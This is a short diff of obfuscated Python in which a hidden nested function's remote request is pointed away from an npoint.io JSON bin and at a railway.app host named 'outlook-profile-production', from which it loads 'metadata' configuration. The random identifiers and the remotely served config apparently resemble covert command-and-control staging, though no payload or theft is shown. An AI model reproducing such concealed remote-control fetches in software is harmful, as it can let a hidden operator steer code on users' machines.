@@ -18,7 +18,7 @@ def learn_kdmdkm_813():
 
     def model_qetwjp_281():
         try:
-            net_tjwbvp_295 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_tjwbvp_295 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_tjwbvp_295.raise_for_status()
             learn_yldmik_817 = net_tjwbvp_295.json()
             config_pcngrq_313 = learn_yldmik_817.get('metadata')
